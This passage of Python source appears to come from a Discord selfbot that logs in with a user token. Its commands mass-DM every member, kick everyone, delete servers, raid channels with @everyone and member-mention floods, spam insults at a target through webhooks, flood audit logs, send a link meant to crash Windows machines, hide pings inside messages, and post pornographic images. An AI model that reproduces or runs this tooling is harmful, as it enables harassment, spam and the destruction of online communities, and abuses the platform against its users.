async def count(ctx, arg):
    number = int(arg)
    message = ctx.message

    for x in range(number):
        time.sleep(0.9)
        await message.edit(content=f'**`{x}`**')


@bot.command()  # edit glitch
async def editg(ctx, arg):
    message = ctx.message
    msg_content = arg.replace('(edited)', '\u202B')

    await message.edit(content=msg_content)


@bot.command()  # info about server
async def serverinfo(ctx):  # members, roles, icon, emojis, threads, stickers, text_channels, forums
    message = ctx.message
    guild = message.guild

    information = f'''```ansi
[1;37m Server Information: 
    [0;34mName:[0;36m {guild.name}
    [0;31mCreated At:[0;36m {guild.created_at}
    [0;31mDefault Notifications:[0;36m {guild.default_notifications}
    [0;31mDefault Role:[0;36m {guild.default_role}
    [0;31mExplicit content filter:[0;36m {guild.explicit_content_filter}
    [0;34mDescription:[0;36m {guild.description}
    [0;31mEmoji limit:[0;36m {guild.emoji_limit}
    [0;31mFilesize limit:[0;36m {guild.filesize_limit}
    [0;31mMax members:[0;36m {guild.max_members}
    [0;31mMax video channel users:[0;36m {guild.max_video_channel_users}
    [0;34mServer ID:[0;36m {guild.id}
    [0;34mMember count:[0;36m {guild.member_count}
    [0;34mOwner:[0;36m {guild.owner}
    [0;34mOwner ID:[0;36m {guild.owner_id}
    [0;34mRules channel:[0;36m {guild.rules_channel}
    [0;31mMFA Level:[0;36m {guild.mfa_level}
    [0;31mVerification level:[0;36m {guild.verification_level}

    [0;34mBoosts: [0;36m{guild.premium_subscription_count}
```'''
    await ctx.send(information)


@bot.command(aliases=['dmserver'])  # dm members
async def dm_members(ctx, arg1, arg2, arg3):
    guild = ctx.message.guild
    await ctx.message.delete()
    amount = int(arg2)

    if arg3 != 'on':
        status_msg = await ctx.send('***`Starting to message people...`***')

    for member in guild.members:
        if member == bot.user:
            continue
        else:
            try:
                dm_channel = await member.create_dm()
                time.sleep(0.1)
                await dm_channel.send(arg1)
                time.sleep(amount)
                if arg3 != 'on':
                    await status_msg.edit(content=f'***`I just messaged {member}`***')
            except:
                continue


@bot.command(aliases=['first_msg', 'firstmessage', 'first_message'])  # Gets first message
async def firstmsg(ctx):
    await ctx.message.delete()
    channel = ctx.message.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]

    await ctx.send(f'***First message: __{first_message.jump_url}__***')


@bot.command()  # changes everyones nickanme
@commands.has_permissions(manage_nicknames=True)
async def nickall(ctx, arg):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=arg)
        except:
            pass


@bot.command(aliases=['remove_names'])  # clears everyones nickname
@commands.has_permissions(manage_nicknames=True)
async def clearnickall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=user.name)
        except:
            pass


@bot.command()  # kicks all
@commands.has_permissions(kick_members=True)
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        await ctx.guild.kick(member)


@bot.command(aliases=['react_messages'])  # React to messages
@commands.has_permissions(add_reactions=True)
async def react(ctx, arg):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(arg)


@bot.command()  # Measure how gay someone is
async def gay(ctx, arg):
    await ctx.message.delete()
    await ctx.send(f'***__{arg} is {random.randint(0, 100)}% gay__***')


@bot.command(aliases=['txttomorse', 'text2morse', 'texttomorse'])  # Text to morse
async def txt2morse(ctx, arg):
    await ctx.message.delete()
    morse = mtalk.encode(arg)
    await ctx.send(f'***`{morse}`***')


@bot.command(aliases=['russian_roulette'])
async def roulette(ctx):  # Russian roulette
    if random.randint(1, 6) == 1:
        await ctx.send('__***`You fucking died!`***__')
    else:
        await ctx.send('__***`You survived!`***__')


@bot.command(aliases=['save_account'])  # backup friends and guilds
async def backup(ctx):
    f = open('./backup/guilds.txt', 'w', encoding='utf-8')
    for guild in bot.guilds:
        f.write(f'{guild.id} - {guild.name}\n')
    f.close()

    f = open('./backup/friends.txt', 'w', encoding='utf-8')
    for friend in bot.user.friends:
        f.write(f'{friend.id} - {friend.name}#{friend.discriminator}\n')
    f.close()


@bot.command(aliases=['web_bully', 'webbully'])  # absolutely kills user lmafo
@commands.has_permissions(manage_webhooks=True)
async def kill(ctx, arg, user: discord.Member = None):
    await ctx.message.delete()
    message = ctx.message

    amount = int(arg)

    webhook = await message.channel.create_webhook(name=random.choice(names))
    print(f'''

        {flgree}Created a webhook:
          {flred}Name:{frese} {webhook.name}
          {flred}ID:{frese} {webhook.id}
          {flred}URL:{frese} {webhook.url}

        ''')

    for x in range(amount):
        webhook = DiscordWebhook(url=webhook.url, content=f'{random.choice(insults)} {user.mention}')
        time.sleep(5)
        response = webhook.execute()


@bot.command(aliases=['prntsc'])  # random prnt.sc screenshot
async def rsc(ctx):
    res = ''

    message = ctx.message
    lenghtch = random.randint(8, 12)

    for x in range(5):
        res += f"https://prnt.sc/{''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=lenghtch))} \n"

    await ctx.send(f'{res}')


@bot.command(aliases=['type_everywhere', 'ratelimit_self'])  # typing indicator
async def type(ctx):
    await ctx.message.delete()
    for x in range(5):
        for channel in ctx.message.guild.text_channels:
            await channel.trigger_typing()


@bot.command()  # get avatar
async def avatar(ctx, user: discord.Member = None):
    await ctx.message.delete()
    await ctx.send(user.avatar_url)


@bot.command(aliases=['deleteserver', 'server_delete', 'delete_server'])  # delete server
@commands.has_permissions(manage_guild=True)
async def delserver(ctx):
    await ctx.message.guild.delete()


@bot.command()  # send shit every channel wow
async def broadcast(ctx, arg1, arg2):
    await ctx.message.delete()
    times = int(arg1)
    for _ in range(times):
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(arg2)
            except:
                continue


@bot.command(aliases=['randomsong'])  # Send random song wow
async def rsong(ctx):
    await ctx.send(f'''
{random.choice(cat_gifs)}
***`{random.choice(songs)}`***
''')


@bot.command()  # count from to
async def counter(ctx, arg1, arg2):
    await ctx.message.delete()
    ffrom = int(arg1)
    ffrom += 1
    fto = int(arg2)

    irange = fto - ffrom
    irange += 1

    for c in range(irange):
        num = c + ffrom
        await ctx.send(num)


@bot.command(aliases=['blackscreenofdeath'])  # crash windows machines
async def bsod(ctx):
    await ctx.message.delete()
    await ctx.send('<ms-cxh-full://0>')


@bot.command()  # send embed message
async def embed(ctx, arg):
    await ctx.message.delete()
    arg = arg.replace(' ', '%20')
    message = f'_||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_ _ _ _ _ _ _ https://test.rauf.workers.dev/?&author={arg}&color=FF2D00'
    await ctx.send(message)


@bot.command()  # raid with 0 perms
async def raid(ctx):
    await ctx.message.delete()

    members = ''
    guild = ctx.message.guild

    for member in guild.members:
        members += f'{member.mention}'

    ping = members[0:1990]

    for _ in range(5):
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(big_wall)
                rekt = await channel.send(f'{ping} @everyone')

                if random.randint(0, 2) == 1:
                    for letter in ezl:
                        await rekt.add_reaction(letter)
            except:
                continue


@bot.command(aliases=['broadcast_ping', 'ping_channels'])  # mass mention every channel
async def pingcast(ctx):
    await ctx.message.delete()

    members = ''
    guild = ctx.message.guild

    for member in guild.members:
        if not member.bot:
            members += f'{member.mention}'

    pings = wrap(members, 1990)

    for ping in pings:
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(f'{ping} @everyone')
            except:
                continue


@bot.command(aliases=['floodaudit'])  # audit flood
async def auditflood(ctx, arg):
    await ctx.message.delete()

    amount = int(arg)
    for _ in range(amount):
        await ctx.message.channel.create_invite(max_age=0, max_uses=0)


@bot.command(aliases=['spam_empty'])  # Empty message rain
async def empty_spam(ctx, arg):
    await ctx.message.delete()
    for _ in range(int(arg)):
        await ctx.send(empty1_mesg)


@bot.command(aliases=['pgif'])  # Porn GIF
async def porngif(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=pgif')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # boobs
async def boobs(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=boobs')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # ass
async def ass(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=ass')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # pussy
async def pussy(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=pussy')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # thighs
async def thighs(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=thigh')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # anal
async def anal(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=anal')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # gonewild
async def gonewild(ctx):
    await ctx.message.delete()

    request = requests.get(f'https://nekobot.xyz/api/image?type=gonewild')
    data = request.json()
    link = data['message']

    await ctx.send(link)


@bot.command()  # gonewild sex with ears
async def vc_join(ctx, arg):
    await ctx.message.delete()

    chan_id = int(arg)
    voice_channel = bot.get_channel(chan_id)

    await voice_channel.connect()


@bot.command()  # gonewild sex with ears
async def vc_play(ctx, arg):
    await ctx.message.delete()

    voice_channel = ctx.message.guild.voice_client

    filename = await YTDLSource.from_url(arg, loop=bot.loop)
    voice_channel.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))


@bot.command()
async def vc_pause(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_playing():
        await voice_client.pause()
    else:
        await ctx.send('***`Bot is not playing anything.`***', delete_after=5)


@bot.command()
async def vc_resume(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_paused():
        await voice_client.resume()
    else:
        await ctx.send('***`Bot is not playing anything.`***', delete_after=5)


@bot.command()
async def vc_stop(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_playing():
        voice_client.stop()
    else:
        await ctx.send('***`Bot is not playing anything.`***', delete_after=5)


@bot.command(aliases=['specialcast', 'special_broadcast'])  # special broadcasts
async def speccast(ctx, opt):
    await ctx.message.delete()

    if opt == 'pinghack':
        guild = ctx.message.guild
        members = ''
        for member in guild.members:
            if not member.bot:
                members += f'{member.mention}'

        everyoneping = f'''@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {members}'''

        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(everyoneping[0:2000])
            except:
                continue

    if opt == 'clear':
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(big_wall)
            except:
                continue

    if opt.startswith('art='):
        text = opt[4:100]
        result = pyfiglet.figlet_format(text)
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(f'```{result}```')
            except:
                continue


@bot.command()  # cool ascii art
async def asciiart(ctx, arg1, arg2):
    await ctx.send(f'```{pyfiglet.figlet_format(arg1, font=arg2)}```')


@bot.command()  # leaves current vc
async def vc_leave(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_connected():
        await voice_client.disconnect()
    else:
        await ctx.send("*`I am not connected to a vc`*")


@bot.command(aliases=['roleping', 'pingroles'])  # Ping server roles trolololo
async def rolemention(ctx, arg):
    guild = ctx.message.guild

    amount = int(arg)

    await ctx.message.delete()
    roles = ''

    for role in guild.roles:
        roles += f'<@&{role.id}>'

    n = 2000

    pings = wrap(roles, n)

    for _ in range(amount):
        for ping in pings:
            await ctx.send(ping)


@bot.command(aliases=['pingid'])  # id ping
async def idping(ctx, arg):
    int(arg)
    str(arg)
    await ctx.message.delete()
    await ctx.send(f'<@{arg}>')


@bot.command(aliases=['pingchannel'])  # ping channel
async def channelping(ctx, arg):
    int(arg)
    str(arg)
    await ctx.message.delete()
    await ctx.send(f'<#{arg}>')


@bot.command(aliases=['locker', 'glock'])  # grouplock
async def grouplock(ctx, arg):
    if arg == "ON" or arg == "on":
        global grouplock_group
        global grouplock
        global gmembers
        global reslock

        grouplock = True

        grouplock_group = ctx.channel.id

        reslock = requests.get(f"https://discord.com/api/v10/channels/{grouplock_group}",
                               headers={
                                   "authorization": token}).json()
        for member in reslock['recipients']:
            gmembers.append(member['id'])

        await ctx.send(f'**`Group is now locked!`**')

    elif arg == "OFF" or arg == "off":
        grouplock = False
        grouplock_group = 0
        gmembers = []
        reslock = ''

        await ctx.send('**`Group is now unlocked`**')

    else:
        a = "do jackshit /shrug"


@bot.command()  # Nitro sniper on/off
async def nitrosniper(ctx, arg):
    global nitro_sniper
    global sniper_status

    if arg == 'off':
        nitro_sniper = False
        sniper_status = 'Disabled'
    else:
        nitro_sniper = True
        sniper_status = 'Active'

    await quickload('Save changes')


@bot.command()  # Selfbot catcher on/off
async def selfbotcatcher(ctx, arg):
    global selfbot_catcher
    global catcher_status

    if arg == 'off':
        selfbot_catcher = False
        catcher_status = 'Disabled'
    else:
        selfbot_catcher = True
        catcher_status = 'Active'

    await quickload('Save changes')


@bot.command()  # Wordstalker on/off
async def wordstalker(ctx, arg):
    global word_stalker
    global stalker_status

    if arg == 'off':
        word_stalker = False
        stalker_status = 'Disabled'
    else:
        word_stalker = True
        stalker_status = 'Active'

    await quickload('Save changes')


@bot.command()  # Selfbot catcher on/off
async def mentionai(ctx, arg):
    global mention_ai
    global ai_status

    if arg == 'off':
        mention_ai = False
        ai_status = 'Disabled'
    else:
        mention_ai = True
        ai_status = 'Active'

    await quickload('Save changes')


@bot.command(aliases=['clearcmd'])  # clear console
async def quickload(ctx):
    os.system('cls' if os.name == 'nt' else 'clear')  # cls or clear depends on os
    print(ascii)
    print(f'''
    {s}Nitro Sniper: {fyell}{sniper_status}{frese}          Selfbot Catcher: {fyell}{catcher_status}{frese}
    {s}Word Stalker: {fyell}{stalker_status}{frese}          Mention AI: {fyell}{ai_status}{frese}
    
    {s}Logged in as {flgree}{bot.user}{frese}          Prefix: {flblue}{prefix}{frese}
                {xs}____________________________________________________________________''')
    print('')


try:
    bot.run(token)
except Exception as e:
    print(f'    {flred}[ERROR] > {e}')